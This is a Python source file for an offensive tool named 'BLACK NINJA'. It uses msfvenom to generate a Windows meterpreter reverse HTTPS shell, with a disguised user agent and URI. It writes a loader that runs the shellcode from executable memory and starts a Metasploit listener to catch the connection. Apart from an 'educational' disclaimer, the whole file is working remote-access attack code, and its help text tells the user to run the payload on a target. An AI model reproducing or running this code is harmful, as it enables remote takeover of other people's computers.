# ═══════════════════════════════════════════════════════════════
#   BLACK NINJA — Educational Security Research Tool
#   Powered by PrimeSec
#   Owner : cyber ninja
# ═══════════════════════════════════════════════════════════════

banner = """
\033[91m

    ═══════════════════════════════════════════════════════════

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:       
             ;kOOOOOOOOOOOOOOOk:       BLACK NINJA
               ,xOOOOOOOOOOOx,      Powered by PrimeSec
                 .lOOOOOOOl.      Owner: cyber ninja
                    ,dOd,
                      .

    ═══════════════════════════════════════════════════════════

\033[0m
"""

print(banner)


import subprocess
import os

def generate_payload():
    print("\n╔═══════════════════════════════════╗")
    print("║   🔧 PAYLOAD GENERATOR 🔧        ║")
    print("╚═══════════════════════════════════╝\n")
    lhost = input("Enter LHOST: ")
    lport = input("Enter LPORT: ")
    outfile = input("Enter output Python filename (e.g. loader.py): ")

    cmd = [
        "msfvenom",
        "-p", "windows/x64/meterpreter_reverse_https",
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "LURI=/api/v1/data/",
        'HTTPUSERAGENT=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.3240.76',
        "-f", "python"
    ]

    print("\n[+] Generating shellcode using msfvenom...\n")
    result = subprocess.run(cmd, capture_output=True, text=True)

    if result.returncode != 0:
        print("ERROR running msfvenom:")
        print(result.stderr)
        return

    shellcode = result.stdout.strip()

    template = f"""
import ctypes
import threading
from ctypes import wintypes

MEM_COMMIT = 0x1000
PAGE_EXECUTE_READWRITE = 0x40

{shellcode}

# Define functions from kernerl32.dll
kernel32 = ctypes.windll.kernel32
kernel32.GetCurrentProcess.restype = wintypes.HANDLE
kernel32.VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
kernel32.VirtualAllocEx.restype = wintypes.LPVOID
kernel32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
kernel32.WriteProcessMemory.restype = wintypes.BOOL

def ThreadFunction(lpParameter):
    current_process = kernel32.GetCurrentProcess()
    sc_memory = kernel32.VirtualAllocEx(current_process, None, len(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    bytes_written = ctypes.c_size_t(0)
    kernel32.WriteProcessMemory(current_process, sc_memory, ctypes.c_char_p(buf), len(buf), ctypes.byref(bytes_written))
    shell_func = ctypes.CFUNCTYPE(None)(sc_memory)
    shell_func()
    return 1

def Run():
    thread = threading.Thread(target=ThreadFunction, args=(None,))
    thread.start()

if __name__ == "__main__":
    Run()
    """

    with open(outfile, "w") as f:
        f.write(template)

    print(f"\n[+] Payload generated and saved as: {outfile}\n")


def start_listener():
    print("\n╔═══════════════════════════════════╗")
    print("║   🎧 START LISTENER 🎧           ║")
    print("╚═══════════════════════════════════╝\n")
    
    lhost = input("Enter LHOST (your IP): ")
    lport = input("Enter LPORT: ")

    print("\n[+] Starting Metasploit listener...\n")

    rc_content = f"""
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST {lhost}
set LPORT {lport}
set LURI /api/v1/data/
exploit -j
"""

    # Save temporary RC file
    with open("listener.rc", "w") as f:
        f.write(rc_content)

    # Start msfconsole with handler
    os.system("msfconsole -r listener.rc")


def show_help():
    print("\n╔═══════════════════════════════════════════════════════════╗")
    print("║                   📚 HELP & USAGE GUIDE 📚                ║")
    print("╠═══════════════════════════════════════════════════════════╣")
    print("║                                                           ║")
    print("║  [1] GENERATE PAYLOAD                                     ║")
    print("║      - Creates a Windows reverse shell payload            ║")
    print("║      - You need to provide:                               ║")
    print("║        * LHOST: Your attacker IP address                 ║")
    print("║        * LPORT: Listening port (e.g., 4444)              ║")
    print("║        * Output filename (e.g., loader.py)               ║")
    print("║      - Uses msfvenom to generate the shellcode            ║")
    print("║                                                           ║")
    print("║  [2] START LISTENER                                       ║")
    print("║      - Starts a Metasploit listener to catch the shell    ║")
    print("║      - You need to provide:                               ║")
    print("║        * LHOST: Your attacker IP address                 ║")
    print("║        * LPORT: Same port from payload generator         ║")
    print("║      - Waits for incoming connections from the payload   ║")
    print("║                                                           ║")
    print("║  [3] EXIT PROGRAM                                         ║")
    print("║      - Closes Black Ninja tool                            ║")
    print("║                                                           ║")
    print("║  [4] HELP                                                 ║")
    print("║      - Shows this help menu                               ║")
    print("║                                                           ║")
    print("║  📌 WORKFLOW:                                             ║")
    print("║     1. Generate Payload (get your shell code)            ║")
    print("║     2. Start Listener (prepare to receive connection)    ║")
    print("║     3. Execute the generated payload on target           ║")
    print("║                                                           ║")
    print("║  ⚠️  LEGAL WARNING:                                       ║")
    print("║     Use this tool ONLY on systems you own or have        ║")
    print("║     permission to test. Unauthorized access is illegal!  ║")
    print("║                                                           ║")
    print("╚═══════════════════════════════════════════════════════════╝\n")


def main_menu():
    while True:
        print("\n╔═══════════════════════════════════════════╗")
        print("║          ⬛ BLACK NINJA v2.0 ⬛           ║")
        print("║          PAYLOAD MENU INTERFACE           ║")
        print("╠═══════════════════════════════════════════╣")
        print("║  [1] 🔥 Generate Payload                 ║")
        print("║  [2] 🎧 Start Listener                   ║")
        print("║  [3] 🚪 Exit Program                     ║")
        print("║  [4] 📚 Help & Usage Guide               ║")
        print("╠═══════════════════════════════════════════╣")
        print("║  Powered by PrimeSec | Owner: cyber ninja║")
        print("╚═══════════════════════════════════════════╝")

        choice = input("Enter choice: ")

        if choice == "1":
            generate_payload()
        elif choice == "2":
            start_listener()
        elif choice == "3":
            print("\n╔═══════════════════════════════════════════╗")
            print("║     👋 Thank you for using Black Ninja!  ║")
            print("╚═══════════════════════════════════════════╝\n")
            break
        elif choice == "4":
            show_help()
        else:
            print("\n❌ Invalid choice! Please enter 1, 2, 3, or 4.\n")


def startup_warning():
    print("\n\033[91m")
    print("╔═══════════════════════════════════════════════════════════╗")
    print("║                    ⚠️  WARNING ⚠️                          ║")
    print("╠═══════════════════════════════════════════════════════════╣")
    print("║                                                           ║")
    print("║  BLACK NINJA is an educational security research tool.   ║")
    print("║                                                           ║")
    print("║     DISCLAIMER:                                           ║")
    print("║  - Use ONLY on systems you own or have written permission║")
    print("║  - Unauthorized access is ILLEGAL under computer fraud   ║")
    print("║  - The author assumes NO liability for misuse            ║")
    print("║  - Educational purposes ONLY!                            ║")
    print("║                                                           ║")
    print("╠═══════════════════════════════════════════════════════════╣")
    print("║                                                           ║")
    
    response = input("║  Do you agree and want to continue? (Y/N): ")
    
    print("║                                                           ║")
    print("╚═══════════════════════════════════════════════════════════╝")
    print("\033[0m\n")
    
    if response.upper() == "Y":
        return True
    else:
        print("❌ Exiting Black Ninja. Goodbye!\n")
        return False


if __name__ == "__main__":
    if startup_warning():
        main_menu()
